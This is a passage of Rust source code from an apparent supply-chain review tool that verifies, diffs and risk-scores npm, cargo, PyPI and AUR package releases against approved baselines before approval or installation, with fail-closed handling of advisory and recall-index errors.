use std::io::{IsTerminal, Write};

use crate::baseline::{BaselineSelection, resolve_baseline};
use crate::cli::{Output, OutputFormat, RegistryBases};
use crate::diff::compute_delta;
use crate::extract::{ExtractionLimits, safe_extract};
use crate::heuristic::evaluate_with_trust;
use crate::install_ref::InstallRef;
use crate::manifest::{read_aur_srcinfo, read_package_json, read_packed_cargo_toml};
use crate::policy::Policy;
use crate::recursive::ReviewContext;
use crate::registry::{Checksum, Ecosystem, Registry};
use crate::render::{render_json, render_text};
use crate::store::BaselineStore;
use crate::version::VersionInfo;

/// A registry-predecessor baseline that was fetched, verified, and
/// diffed during this review but has never been approved locally.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct UnreviewedBaseline {
    pub version: String,
    pub checksum: Checksum,
}

pub(crate) fn ctxless_registry(
    ecosystem: Ecosystem,
    bases: &RegistryBases,
) -> anyhow::Result<std::rc::Rc<dyn Registry>> {
    Ok(crate::recursive::registry_for(
        ecosystem,
        bases.for_ecosystem(ecosystem),
    ))
}

/// Evaluates a package specification against its baseline, computing delta,
/// OSV advisories, and Sigstore provenance to produce a final Verdict and
/// Delta, plus the recursive review of any install references the payload
/// carries.
pub fn evaluate_package(
    name: &str,
    version_str: &str,
    ecosystem: Ecosystem,
    store: &BaselineStore,
    policy: &Policy,
    ctx: &mut ReviewContext,
) -> anyhow::Result<(
    crate::verdict::Verdict,
    crate::diff::Delta,
    crate::registry::Checksum,
    Option<UnreviewedBaseline>,
)> {
    ctx.enter_scope(ecosystem, name, version_str, true);
    let result = evaluate_scoped(name, version_str, ecosystem, store, policy, ctx);
    ctx.exit_scope();
    result
}

pub(crate) fn evaluate_scoped(
    name: &str,
    version_str: &str,
    ecosystem: Ecosystem,
    store: &BaselineStore,
    policy: &Policy,
    ctx: &mut ReviewContext,
) -> anyhow::Result<(
    crate::verdict::Verdict,
    crate::diff::Delta,
    crate::registry::Checksum,
    Option<UnreviewedBaseline>,
)> {
    let registry = ctx.registry(ecosystem);
    match ecosystem {
        Ecosystem::Npm => evaluate_with_registry::<semver::Version>(
            registry.as_ref(),
            name,
            version_str,
            store,
            policy,
            ctx,
        ),
        Ecosystem::Cargo => evaluate_with_registry::<semver::Version>(
            registry.as_ref(),
            name,
            version_str,
            store,
            policy,
            ctx,
        ),
        Ecosystem::PyPi => evaluate_with_registry::<crate::version::Pep440Version>(
            registry.as_ref(),
            name,
            version_str,
            store,
            policy,
            ctx,
        ),
        Ecosystem::Aur => evaluate_with_registry::<crate::version::AurVersionInfo>(
            registry.as_ref(),
            name,
            version_str,
            store,
            policy,
            ctx,
        ),
    }
}

fn evaluate_with_registry<V: VersionInfo>(
    registry: &dyn Registry,
    name: &str,
    version_str: &str,
    store: &BaselineStore,
    policy: &Policy,
    ctx: &mut ReviewContext,
) -> anyhow::Result<(
    crate::verdict::Verdict,
    crate::diff::Delta,
    crate::registry::Checksum,
    Option<UnreviewedBaseline>,
)> {
    let target_ver = V::parse(version_str)
        .map_err(|e| anyhow::anyhow!("invalid version for `{version_str}`: {e}"))?;

    let ecosystem = registry.ecosystem();
    let registry_base = ctx.bases.for_ecosystem(ecosystem).to_string();
    let target_pkg = registry.resolve(name, version_str)?;

    let target_tarball = ctx.fetch_tarball(registry, &target_pkg)?;

    let checksum = target_pkg.integrity.clone().ok_or_else(|| {
        anyhow::anyhow!(
            "{}@{}: registry provided no content checksum; refusing to trust unverifiable bytes",
            target_pkg.name,
            target_pkg.version
        )
    })?;

    let target_temp = tempfile::tempdir().map_err(|e| anyhow::anyhow!("creating temp dir: {e}"))?;
    extract_for_ecosystem(
        &target_tarball,
        target_temp.path(),
        ecosystem,
        &target_pkg.tarball_url,
    )
    .map_err(|e| {
        anyhow::anyhow!(
            "failed to extract {}@{}: {e}",
            target_pkg.name,
            target_pkg.version
        )
    })?;

    let (target_root, target_manifest) = prepare_extracted_root(
        target_temp.path(),
        ecosystem,
        &target_pkg.name,
        &target_pkg.version,
    )
    .map_err(|e| {
        anyhow::anyhow!(
            "invalid extracted contents for {}@{}: {e}",
            target_pkg.name,
            target_pkg.version
        )
    })?;

    store.record_verified(ecosystem, &target_pkg.name, &target_pkg.version, &checksum)?;

    let baseline_res: BaselineSelection =
        resolve_baseline(&target_pkg.name, &target_ver, registry, store)
            .map_err(|e| anyhow::anyhow!("baseline resolution: {e}"))?;

    let (delta, base_pkgbuild) = if let Some(base_pkg) = baseline_res.resolution.package() {
        let base_tarball = ctx.fetch_tarball(registry, base_pkg)?;
        let base_temp =
            tempfile::tempdir().map_err(|e| anyhow::anyhow!("creating temp dir: {e}"))?;
        extract_for_ecosystem(
            &base_tarball,
            base_temp.path(),
            ecosystem,
            &base_pkg.tarball_url,
        )
        .map_err(|e| {
            anyhow::anyhow!(
                "failed to extract baseline {}@{}: {e}",
                base_pkg.name,
                base_pkg.version
            )
        })?;
        let (base_root, base_manifest) = prepare_extracted_root(
            base_temp.path(),
            ecosystem,
            &base_pkg.name,
            &base_pkg.version,
        )
        .map_err(|e| {
            anyhow::anyhow!(
                "invalid extracted contents for baseline {}@{}: {e}",
                base_pkg.name,
                base_pkg.version
            )
        })?;

        let delta = compute_delta(
            Some(&base_root),
            Some(&base_manifest),
            Some(&base_pkg.version),
            &target_root,
            &target_manifest,
            &target_pkg.version,
        )?;
        let base_pkgbuild = if ecosystem == Ecosystem::Aur {
            match std::fs::read_to_string(base_root.join("PKGBUILD")) {
                Ok(text) => Some(text),
                Err(_) => Some(String::new()),
            }
        } else {
            None
        };
        (delta, base_pkgbuild)
    } else {
        (
            compute_delta(
                None,
                None,
                None,
                &target_root,
                &target_manifest,
                &target_pkg.version,
            )?,
            None,
        )
    };

    let is_unreviewed = matches!(
        baseline_res.resolution,
        crate::baseline::BaselineResolution::RegistryPredecessor(_)
    );

    let unreviewed_baseline = match baseline_res.resolution.package() {
        Some(pkg) if is_unreviewed => pkg.integrity.clone().map(|checksum| UnreviewedBaseline {
            version: pkg.version.clone(),
            checksum,
        }),
        _ => None,
    };

    // The error is kept rather than collapsed into the report. An operator who
    // set `fail_closed_network` asked for exactly this to stop the review, and
    // as an `unverified` report it produced no finding at all, so the verdict
    // came out the same as a clean advisory pass. It becomes a finding below.
    let (advisories, advisory_error) = match crate::advisory::fetch_advisories(
        &target_pkg.name,
        &target_pkg.version,
        ecosystem,
        Some(store),
        policy,
    ) {
        Ok(report) => (report, None),
        Err(e) => (
            crate::advisory::AdvisoryReport::unverified(&e.to_string()),
            Some(e.to_string()),
        ),
    };

    let provenance = match ecosystem {
        Ecosystem::Npm => Some(crate::provenance::inspect_provenance(
            &target_pkg.name,
            &target_pkg.version,
            &checksum,
            None,
            &registry_base,
            Some(store),
            policy,
        )),
        Ecosystem::PyPi => {
            let raw_name = target_pkg
                .tarball_url
                .rsplit('/')
                .next()
                .unwrap_or(&target_pkg.name);
            let filename = raw_name.split(&['?', '#'][..]).next().unwrap_or(raw_name);
            Some(crate::provenance::inspect_provenance_pypi(
                &target_pkg.name,
                &target_pkg.version,
                filename,
                &checksum,
                &registry_base,
                Some(store),
                policy,
            ))
        }
        Ecosystem::Cargo => None,
        Ecosystem::Aur => None,
    };

    let author_changed = {
        let target_author = registry.release_author(&target_pkg);
        let baseline_author = baseline_res
            .resolution
            .package()
            .and_then(|p| registry.release_author(p));
        // Unknown authorship on either side is "no signal", never a finding.
        matches!(
            (baseline_author, target_author),
            (Some(base), Some(target)) if base != target
        )
    };

    let mut verdict = evaluate_with_trust(
        &target_pkg.name,
        ecosystem,
        &checksum.to_display(),
        &delta,
        is_unreviewed,
        baseline_res.prior_release_yanked,
        baseline_res.target_release_yanked,
        author_changed,
        policy,
        Some(&advisories),
        provenance.as_ref(),
    );

    if ecosystem == Ecosystem::Aur {
        if matches!(base_pkgbuild.as_deref(), Some("")) {
            verdict.findings.push(baseline_unreadable_finding());
        }
        // `None` is first sighting (no baseline package); `Some("")` is an
        // unreadable baseline file, already surfaced above. Both skip pair
        // rules; anything else diffs.
        let base_text = match base_pkgbuild.as_deref() {
            None | Some("") => None,
            Some(text) => Some(text),
        };
        let extra = crate::pkgbuild::review_roots(&target_root, base_text, &delta);
        crate::heuristic::apply_extra_findings(&mut verdict, extra, policy);
    }

    // Recall-index staleness (R28): a synced snapshot older than the
    // policy window is disclosed; an unreadable one is disclosed at
    // HIGH — a blind revocation index is a coverage hole, never silence.
    match crate::recall::stale_band(policy) {
        Ok(Some(band)) => {
            let finding = crate::verdict::Finding {
                rule_id: "R28_RECALL_STALE".to_string(),
                severity: band,
                title: "Recall index stale".to_string(),
                description: format!(
                    "the synced revocation index is older than the policy window                      ({}h); revocation coverage is not current",
                    policy.recall.max_age_hours
                ),
            };
            crate::heuristic::apply_extra_findings(&mut verdict, vec![finding], policy);
        }
        Ok(None) => {}
        Err(e) => {
            let finding = crate::verdict::Finding {
                rule_id: "R28_RECALL_STALE".to_string(),
                severity: crate::verdict::VerdictBand::High,
                title: "Recall index unreadable".to_string(),
                description: format!("the synced revocation index could not be read: {e:#}"),
            };
            crate::heuristic::apply_extra_findings(&mut verdict, vec![finding], policy);
        }
    }

    if let Some(detail) = advisory_error {
        let finding = crate::verdict::Finding {
            rule_id: "R09_ADVISORY_UNVERIFIED".to_string(),
            severity: crate::verdict::VerdictBand::High,
            title: "Advisory source unavailable".to_string(),
            description: format!(
                "the advisory lookup failed and policy is configured to fail closed, so \
                 revocation coverage for this release is unknown: {detail}"
            ),
        };
        crate::heuristic::apply_extra_findings(&mut verdict, vec![finding], policy);
    }

    // Recursive review pass: every install reference the payload carries
    // is disclosed (R24), then piped through the same review engine with
    // depth/cycle/budget caps failing closed (R25/R26), and child findings
    // at or above the policy band roll up into this verdict (R27).
    let (mut refs, target_disclosure) =
        collect_install_refs(ecosystem, &target_root, &target_manifest, &delta);
    let mut ref_findings = crate::recursive::install_ref_findings(&refs);
    if let Some(finding) = target_disclosure {
        ref_findings.push(finding);
    }
    if refs.len() > MAX_INSTALL_REFS {
        let total = refs.len();
        refs.truncate(MAX_INSTALL_REFS);
        ref_findings.push(crate::verdict::Finding {
            rule_id: "R24_LIFECYCLE_INSTALL_REF".to_string(),
            severity: crate::verdict::VerdictBand::High,
            title: "Install-reference cap exceeded".to_string(),
            description: format!(
                "{total} install references found; only the first {MAX_INSTALL_REFS} are \
                 reviewed recursively and the rest are NOT reviewed — fail closed"
            ),
        });
    }
    if !ref_findings.is_empty() {
        crate::heuristic::apply_extra_findings(&mut verdict, ref_findings, policy);
    }
    if !refs.is_empty() {
        let (children, mut rollup) = ctx.review_children(&refs, store, policy);
        for child in &children {
            if child.band >= ctx.child_block_band() {
                rollup.push(crate::recursive::second_order_finding(child));
            }
        }
        verdict.recursive = children;
        if !rollup.is_empty() {
            crate::heuristic::apply_extra_findings(&mut verdict, rollup, policy);
        }
    }

    Ok((verdict, delta, checksum, unreviewed_baseline))
}

/// Cap on install references reviewed recursively per package: a hostile
/// payload naming thousands of references must not multiply the review
/// fan-out. The overflow is disclosed fail closed at the call site.
const MAX_INSTALL_REFS: usize = 32;

/// Install references in the reviewed payload, per ecosystem: npm manifest
/// lifecycle scripts, AUR PKGBUILD npm/bun delivery, PyPI wheel
/// `.data/scripts`. Cargo `build.rs` can shell out but has no structured
/// install-reference grammar to extract statically in v1 — the cargo lane
/// is disclosed by the existing build-code findings.
fn collect_install_refs(
    ecosystem: Ecosystem,
    target_root: &std::path::Path,
    target_manifest: &crate::manifest::PackageJson,
    delta: &crate::diff::Delta,
) -> (Vec<InstallRef>, Option<crate::verdict::Finding>) {
    match ecosystem {
        Ecosystem::Npm => (
            crate::install_ref::from_npm_lifecycle(target_manifest),
            None,
        ),
        Ecosystem::PyPi => (
            crate::install_ref::from_wheel_data_scripts(target_root, delta),
            None,
        ),
        Ecosystem::Aur => match std::fs::read_to_string(target_root.join("PKGBUILD")) {
            Ok(text) => (crate::pkgbuild::npm_delivery_refs(&text), None),
            Err(e) => (Vec::new(), Some(target_unreadable_finding(&e.to_string()))),
        },
        Ecosystem::Cargo => (Vec::new(), None),
    }
}

fn extract_for_ecosystem(
    tarball: &[u8],
    dest: &std::path::Path,
    ecosystem: Ecosystem,
    tarball_url: &str,
) -> Result<crate::extract::ExtractStats, crate::error::BluelineError> {
    if ecosystem == Ecosystem::PyPi && tarball_url.ends_with(".whl") {
        return crate::wheel_extract::safe_extract_wheel(
            tarball,
            dest,
            &ExtractionLimits::default(),
        );
    }
    safe_extract(tarball, dest, &ExtractionLimits::default())
}

/// Locate and parse the package manifest inside an extracted release tree.
/// Cargo `.crate` archives additionally must unpack to exactly one top-level
/// directory named `{canonical-name}-{version}`; AUR archives are the repo
/// root itself (PKGBUILD + .SRCINFO + patches, no pkgbase subdirectory).
fn prepare_extracted_root(
    temp_root: &std::path::Path,
    ecosystem: Ecosystem,
    canonical_name: &str,
    version: &str,
) -> Result<(std::path::PathBuf, crate::manifest::PackageJson), crate::error::BluelineError> {
    let root = match ecosystem {
        Ecosystem::Cargo => {
            crate::registry::cratesio::verify_single_root(temp_root, canonical_name, version)?
        }
        _ => temp_root.to_path_buf(),
    };
    let manifest = match ecosystem {
        Ecosystem::Npm => read_package_json(&package_json_path(&root))?,
        Ecosystem::Cargo => read_packed_cargo_toml(&root.join("Cargo.toml"))?.manifest_view(),
        Ecosystem::Aur => {
            for required in ["PKGBUILD", ".SRCINFO"] {
                if !root.join(required).is_file() {
                    return Err(crate::error::BluelineError::Manifest(
                        canonical_name.to_string(),
                        format!(
                            "AUR archive is missing `{required}` at its root; refusing to review"
                        ),
                    ));
                }
            }
            let manifest = read_aur_srcinfo(&root.join(".SRCINFO"))?;
            if manifest.name != canonical_name {
                return Err(crate::error::BluelineError::Manifest(
                    canonical_name.to_string(),
                    format!(
                        "AUR archive declares pkgbase `{}` but the review resolved `{canonical_name}`; refusing to review",
                        manifest.name
                    ),
                ));
            }
            manifest
        }
        Ecosystem::PyPi => {
            let candidate = root.join("METADATA");
            let mut deps = std::collections::BTreeMap::new();
            if let Ok(raw) = std::fs::read_to_string(&candidate) {
                for line in raw.lines() {
                    if let Some(rest) = line.strip_prefix("Requires-Dist:") {
                        let dep = rest.trim().split(';').next().unwrap_or("").trim();
                        if !dep.is_empty() {
                            let name = dep.split_whitespace().next().unwrap_or(dep).to_string();
                            deps.insert(name.clone(), dep.to_string());
                        }
                    }
                }
            }
            crate::manifest::PackageJson {
                name: canonical_name.to_string(),
                version: version.to_string(),
                dependencies: deps,
                ..Default::default()
            }
        }
    };
    // Every lane that parses a manifest from the archive must bind the name it
    // declares to the name the registry resolved. `package_json_path` resolves
    // through `find_package_prefix`, which descends into a single top-level
    // directory, so a tarball rooted at `evil/` was read as `evil/package.json`
    // and its declared name discarded. The allowlist, blocklist and baseline
    // key are all evaluated against the resolved name while the installed
    // bytes are the attacker's, which defeats exact-match allowlisting for a
    // package that lies about its own identity.
    if !matches!(ecosystem, Ecosystem::PyPi) && manifest.name != canonical_name {
        return Err(crate::error::BluelineError::Manifest(
            canonical_name.to_string(),
            format!(
                "archive manifest declares `{}` but the review resolved `{canonical_name}`; refusing to review",
                manifest.name
            ),
        ));
    }
    if manifest.name.trim().is_empty() {
        return Err(crate::error::BluelineError::Manifest(
            canonical_name.to_string(),
            "archive manifest declares an empty name; refusing to review".to_string(),
        ));
    }
    Ok((root, manifest))
}

// Pair rules cannot run against a baseline whose PKGBUILD cannot be read,
// so the refusal itself must be loud: High, matching the unparseable case.
fn baseline_unreadable_finding() -> crate::verdict::Finding {
    crate::verdict::Finding {
        rule_id: "R00_BASELINE_UNREADABLE".to_string(),
        severity: crate::verdict::VerdictBand::High,
        title: "Baseline PKGBUILD unreadable".to_string(),
        description: "baseline PKGBUILD could not be read; pair rules skipped".to_string(),
    }
}

// The target PKGBUILD itself cannot be read (permissions, non-UTF-8):
// delivery references are unextractable, so the hole is disclosed at the
// same HIGH band rather than scanned as an empty file.
fn target_unreadable_finding(detail: &str) -> crate::verdict::Finding {
    crate::verdict::Finding {
        rule_id: "R00_BASELINE_UNREADABLE".to_string(),
        severity: crate::verdict::VerdictBand::High,
        title: "Target PKGBUILD unreadable".to_string(),
        description: format!(
            "target PKGBUILD could not be read ({detail}); delivery references unextractable"
        ),
    }
}

fn bootstrap_hint(verdict: &crate::verdict::Verdict) -> Option<String> {
    let name = &crate::render::sanitize_single_line(&verdict.name);
    if verdict
        .findings
        .iter()
        .any(|f| f.rule_id == "R07_UNREVIEWED_PREDECESSOR_BASELINE")
    {
        let base = &crate::render::sanitize_single_line(
            verdict.baseline_version.as_deref().unwrap_or("unknown"),
        );
        let other_risk = verdict.findings.iter().any(|f| {
            f.rule_id != "R07_UNREVIEWED_PREDECESSOR_BASELINE"
                && f.rule_id != "R06_FIRST_SIGHTING"
                && f.severity > crate::verdict::VerdictBand::Low
        });
        let remedy = if other_risk {
            "Address the findings above first; a baseline allowlist rule will not clear them."
                .to_string()
        } else {
            format!(
                "Run `blueline review {name}@{base}` to approve it, or add an [[allowlist.packages]] rule for this \
                 package with `allow_unreviewed_baseline = true` to blueline.toml. Walking the chain one version \
                 at a time works, but a package with a long release history needs one run per version back to the \
                 first."
            )
        };
        Some(format!(
            "hint: baseline `{name}@{base}` was never approved locally. {remedy}"
        ))
    } else if verdict
        .findings
        .iter()
        .any(|f| f.rule_id == "R06_FIRST_SIGHTING")
    {
        let other_risk = verdict.findings.iter().any(|f| {
            f.rule_id != "R06_FIRST_SIGHTING" && f.severity > crate::verdict::VerdictBand::Low
        });
        let remedy = if other_risk {
            "Address the findings above first; a baseline allowlist rule will not clear them."
        } else {
            "Approve it from an interactive terminal, or add an [[allowlist.packages]] rule with `allow_unreviewed_baseline = true` to blueline.toml to onboard it without one."
        };
        Some(format!(
            "hint: no approved baseline exists for `{name}`. {remedy}"
        ))
    } else {
        None
    }
}

pub fn run(
    pkg_spec: &str,
    ecosystem: Ecosystem,
    bases: &RegistryBases,
    output: Output,
    policy_path: Option<&std::path::Path>,
    yes: bool,
) -> anyhow::Result<()> {
    let policy = Policy::load_or_default(policy_path)?;
    let registry = ctxless_registry(ecosystem, bases)?;
    let (name, version_str) = parse_spec_flexible(pkg_spec, registry.as_ref())?;
    let store = BaselineStore::open()?;

    let mut ctx = ReviewContext::new(&policy, bases.clone());
    let (verdict, delta, checksum, unreviewed_baseline) =
        evaluate_package(&name, &version_str, ecosystem, &store, &policy, &mut ctx)?;

    let format = output.resolve(std::io::stdout().is_terminal());
    match format {
        OutputFormat::Json => {
            render_json(&verdict)?;
        }
        OutputFormat::Text => {
            render_text(&verdict, &delta);
        }
    }

    if yes {
        if verdict.band == crate::verdict::VerdictBand::Low {
            store.mark_clean(ecosystem, &verdict.name, &verdict.target_version, &checksum)?;
            let _ = store.record_audit_log(
                ecosystem,
                &verdict.name,
                &verdict.target_version,
                &checksum.to_display(),
                "approve_auto_yes",
                0,
                "auto_approved_low_risk",
                "user",
                None,
            );
            if format != OutputFormat::Json {
                println!(
                    "Approved {}@{} and marked clean in baseline store (--yes).",
                    name, version_str
                );
            }
            return Ok(());
        } else {
            eprintln!(
                "Cannot auto-approve {}@{}: risk verdict is {} (score: {}). Refusing to proceed (--yes).",
                name, version_str, verdict.band, verdict.risk_score
            );
            if let Some(hint) = bootstrap_hint(&verdict) {
                eprintln!("{hint}");
            }
            std::process::exit(2);
        }
    }

    if format != OutputFormat::Json
        && std::io::stdin().is_terminal()
        && std::io::stdout().is_terminal()
    {
        interactive_prompt(
            &store,
            ecosystem,
            &verdict.name,
            &verdict.target_version,
            &checksum,
            &delta,
            unreviewed_baseline.as_ref(),
        )?;
    } else if verdict.band != crate::verdict::VerdictBand::Low {
        if !std::io::stdin().is_terminal() || !std::io::stdout().is_terminal() {
            eprintln!(
                "Non-interactive terminal detected without `--yes`. Risk verdict is {} (score: {}). Refusing to proceed.",
                verdict.band, verdict.risk_score
            );
            if let Some(hint) = bootstrap_hint(&verdict) {
                eprintln!("{hint}");
            }
        }
        std::process::exit(2);
    }

    Ok(())
}

pub fn install(
    pkg_spec: &str,
    ecosystem: Ecosystem,
    bases: &RegistryBases,
    npm_args: &[String],
    policy_path: Option<&std::path::Path>,
    yes: bool,
) -> anyhow::Result<()> {
    if ecosystem == Ecosystem::Cargo {
        eprintln!(
            "blueline install refuses cargo packages: building a crate executes its `build.rs` \
             script, which blueline cannot sandbox. Review it instead with \
             `blueline review <crate>@<version> --ecosystem cargo`."
        );
        std::process::exit(2);
    }
    if ecosystem == Ecosystem::PyPi {
        eprintln!(
            "blueline install refuses PyPI packages: installing a Python sdist executes arbitrary \
             build code and wheels may contain installer hooks; review it instead with \
             `blueline review <package>==<version> --ecosystem pypi`."
        );
        std::process::exit(2);
    }
    if ecosystem == Ecosystem::Aur {
        eprintln!(
            "blueline install refuses AUR packages: building a package executes its PKGBUILD \
             shell script, which blueline cannot sandbox. Review it instead with \
             `blueline review <package>@<version> --ecosystem aur`."
        );
        std::process::exit(2);
    }

    crate::executor::validate_extra_args(npm_args)?;
    let policy = Policy::load_or_default(policy_path)?;
    let registry = ctxless_registry(ecosystem, bases)?;
    let (name, version_str) = parse_spec_flexible(pkg_spec, registry.as_ref())?;
    let store = BaselineStore::open()?;

    let mut ctx = ReviewContext::new(&policy, bases.clone());
    let (verdict, delta, checksum, unreviewed_baseline) =
        evaluate_package(&name, &version_str, ecosystem, &store, &policy, &mut ctx)?;
    render_text(&verdict, &delta);

    let is_interactive = std::io::stdin().is_terminal() && std::io::stdout().is_terminal();
    let approved = if yes {
        if verdict.band == crate::verdict::VerdictBand::Low {
            store.mark_clean(ecosystem, &verdict.name, &verdict.target_version, &checksum)?;
            let _ = store.record_audit_log(
                ecosystem,
                &verdict.name,
                &verdict.target_version,
                &checksum.to_display(),
                "approve_auto_yes",
                0,
                "auto_approved_low_risk",
                "user",
                None,
            );
            println!(
                "Approved {}@{} and marked clean in baseline store (--yes).",
                name, version_str
            );
            true
        } else {
            eprintln!(
                "Cannot auto-approve {}@{}: risk verdict is {} (score: {}). Refusing to install (--yes).",
                name, version_str, verdict.band, verdict.risk_score
            );
            if let Some(hint) = bootstrap_hint(&verdict) {
                eprintln!("{hint}");
            }
            false
        }
    } else if is_interactive {
        interactive_prompt(
            &store,
            ecosystem,
            &verdict.name,
            &verdict.target_version,
            &checksum,
            &delta,
            unreviewed_baseline.as_ref(),
        )?
    } else {
        if verdict.band != crate::verdict::VerdictBand::Low {
            eprintln!(
                "Non-interactive terminal detected without `--yes`. Risk verdict is {} (score: {}). Refusing to install.",
                verdict.band, verdict.risk_score
            );
            if let Some(hint) = bootstrap_hint(&verdict) {
                eprintln!("{hint}");
            }
        }
        verdict.band == crate::verdict::VerdictBand::Low
    };

    if approved {
        let install_spec = format!("{name}@{version_str}");
        crate::executor::install_with_ignore_scripts(
            &install_spec,
            bases.for_ecosystem(Ecosystem::Npm),
            npm_args,
        )?;
        Ok(())
    } else {
        eprintln!("Held {}@{}; installation blocked.", name, version_str);
        std::process::exit(2);
    }
}

fn interactive_prompt(
    store: &BaselineStore,
    ecosystem: Ecosystem,
    name: &str,
    version: &str,
    checksum: &Checksum,
    delta: &crate::diff::Delta,
    unreviewed_baseline: Option<&UnreviewedBaseline>,
) -> anyhow::Result<bool> {
    loop {
        print!("\n[a]pprove · [h]old · [d]iff > ");
        std::io::stdout().flush()?;
        let mut input = String::new();
        if std::io::stdin().read_line(&mut input)? == 0 {
            eprintln!("Held (EOF)");
            std::process::exit(2);
        }
        let choice = input.trim().to_lowercase();
        match choice.as_str() {
            "a" | "approve" => {
                store.mark_clean(ecosystem, name, version, checksum)?;
                let _ = store.record_audit_log(
                    ecosystem,
                    name,
                    version,
                    &checksum.to_display(),
                    "approve",
                    0,
                    "approved",
                    "user",
                    None,
                );
                println!(
                    "Approved {}@{} and marked clean in baseline store.",
                    name, version
                );
                if let Some(base) = unreviewed_baseline {
                    offer_baseline_approval(store, ecosystem, name, base)?;
                }
                return Ok(true);
            }
            "h" | "hold" => {
                let _ = store.record_audit_log(
                    ecosystem,
                    name,
                    version,
                    &checksum.to_display(),
                    "hold",
                    0,
                    "held",
                    "user",
                    None,
                );
                eprintln!("Held {}@{}; release unapproved.", name, version);
                std::process::exit(2);
            }
            "d" | "diff" => {
                let mut showed_any = false;
                for file in delta
                    .files_added
                    .iter()
                    .chain(delta.files_modified.iter())
                    .chain(delta.files_removed.iter())
                {
                    if let Some(diff) = &file.unified_diff {
                        println!(
                            "\n--- {}",
                            crate::render::sanitize_terminal(&file.relative_path)
                        );
                        print!("{}", crate::render::sanitize_terminal(diff));
                        showed_any = true;
                    }
                }
                if !showed_any {
                    println!("\nNo text diffs available.");
                } else {
                    println!("\n─── end of blueline diff (trusted output resumes) ───");
                }
            }
            _ => {
                println!(
                    "Invalid choice. Enter 'a' to approve, 'h' to hold, or 'd' to view diffs."
                );
            }
        }
    }
}

/// Offers to approve the unreviewed baseline in the same session. The
/// baseline tarball was already fetched and verified against the registry
/// checksum during this review, so approving it records a trust
/// decision over bytes that were verified moments ago. Anything other than
/// an explicit `y` or `yes` leaves it unapproved (fail closed). A store
/// failure here never undoes the target approval; the baseline simply
/// stays unapproved.
fn offer_baseline_approval(
    store: &BaselineStore,
    ecosystem: Ecosystem,
    name: &str,
    base: &UnreviewedBaseline,
) -> anyhow::Result<()> {
    offer_baseline_approval_with_reader(store, ecosystem, name, base, &mut std::io::stdin().lock())
}

fn offer_baseline_approval_with_reader(
    store: &BaselineStore,
    ecosystem: Ecosystem,
    name: &str,
    base: &UnreviewedBaseline,
    reader: &mut dyn std::io::BufRead,
) -> anyhow::Result<()> {
    print!(
        "\nAlso approve unreviewed baseline {name}@{base} (tarball fetched and \
         verified this session)? [y/N] > ",
        name = crate::render::sanitize_single_line(name),
        base = crate::render::sanitize_single_line(&base.version)
    );
    std::io::stdout().flush()?;
    let mut input = String::new();
    if reader.read_line(&mut input)? == 0 {
        return Ok(());
    }
    if !matches!(input.trim().to_lowercase().as_str(), "y" | "yes") {
        return Ok(());
    }
    let outcome = (|| -> anyhow::Result<()> {
        store.record_verified(ecosystem, name, &base.version, &base.checksum)?;
        store.mark_clean(ecosystem, name, &base.version, &base.checksum)?;
        let _ = store.record_audit_log(
            ecosystem,
            name,
            &base.version,
            &base.checksum.to_display(),
            "approve",
            0,
            "approved_baseline_chain",
            "user",
            None,
        );
        Ok(())
    })();
    if let Err(e) = outcome {
        eprintln!(
            "note: could not approve baseline {name}@{}: {e:#}; baseline left unapproved",
            base.version
        );
        return Ok(());
    }
    println!(
        "Approved baseline {}@{} and marked clean in baseline store.",
        crate::render::sanitize_single_line(name),
        crate::render::sanitize_single_line(&base.version)
    );
    Ok(())
}

/// `<name>@<version>` → (name, version). Scoped names (`@scope/pkg@1.0.0`)
/// split from the right so the scope's leading `@` stays with the name.
/// PyPI alias `name==version` is also accepted.
pub fn parse_spec(spec: &str, ecosystem: Ecosystem) -> anyhow::Result<(String, String)> {
    let (name, version) = if let Some((n, v)) = spec.split_once("==") {
        (n, v)
    } else {
        let mut parts = spec.rsplitn(2, '@');
        let v = parts.next().unwrap_or("");
        let n = parts.next().unwrap_or("");
        (n, v)
    };
    if name.is_empty() || version.is_empty() {
        return Err(crate::error::BluelineError::InvalidPackageSpec(spec.to_string()).into());
    }
    let name_valid = if let Some(unscoped) = name.strip_prefix('@') {
        !unscoped
            .chars()
            .any(|c| matches!(c, '[' | ']' | '@' | ' ' | '\t'))
    } else {
        !name
            .chars()
            .any(|c| matches!(c, '[' | ']' | '@' | ' ' | '\t'))
    };
    if !name_valid {
        return Err(crate::error::BluelineError::InvalidPackageSpec(spec.to_string()).into());
    }
    let version_valid = match ecosystem {
        Ecosystem::Npm | Ecosystem::Cargo => semver::Version::parse(version).is_ok(),
        Ecosystem::PyPi => crate::version::Pep440Version::parse(version).is_ok(),
        Ecosystem::Aur => crate::version::AurVersionInfo::parse(version).is_ok(),
    };
    if !version_valid {
        return Err(crate::error::BluelineError::InvalidPackageSpec(spec.to_string()).into());
    }
    Ok((name.to_string(), version.to_string()))
}

/// Flexible parser for install: `<name>` or `<name>@<version>`.
/// If version is omitted, resolves the registry's default version
/// (`dist-tags.latest` for npm, falling back to latest stable semver release).
pub(crate) fn parse_spec_flexible(
    spec: &str,
    registry: &dyn Registry,
) -> anyhow::Result<(String, String)> {
    let has_version_sep = spec.contains("==")
        || if let Some(rest) = spec.strip_prefix('@') {
            rest.contains('@')
        } else {
            spec.contains('@')
        };

    if has_version_sep {
        parse_spec(spec, registry.ecosystem())
    } else {
        let name = spec.trim();
        if name.is_empty() {
            return Err(crate::error::BluelineError::InvalidPackageSpec(spec.to_string()).into());
        }
        match registry.default_version(name)? {
            Some(default) => Ok((name.to_string(), default)),
            None => Err(anyhow::anyhow!("no versions found for `{name}`")),
        }
    }
}

/// Resolves the package.json path inside an extracted package tarball.
/// Supports standard `package/`, single-directory roots (e.g. `@types/*`), and flat roots.
fn package_json_path(root: &std::path::Path) -> std::path::PathBuf {
    let prefix = crate::diff::find_package_prefix(root);
    let candidate = prefix.join("package.json");
    if candidate.exists() {
        candidate
    } else {
        root.join("package.json")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hint_verdict(findings: Vec<crate::verdict::Finding>) -> crate::verdict::Verdict {
        crate::verdict::Verdict {
            name: "pkg".to_string(),
            target_version: "1.1.0".to_string(),
            baseline_version: Some("1.0.0".to_string()),
            integrity: "sha512:aa".to_string(),
            ecosystem: crate::registry::Ecosystem::Npm,
            band: crate::verdict::VerdictBand::Medium,
            risk_score: 10,
            findings,
            diff_summary: crate::verdict::DiffSummary {
                files_added: 0,
                files_removed: 0,
                files_modified: 0,
                lines_added: 0,
                lines_deleted: 0,
            },
            trust_sources: None,
            recursive: Vec::new(),
        }
    }

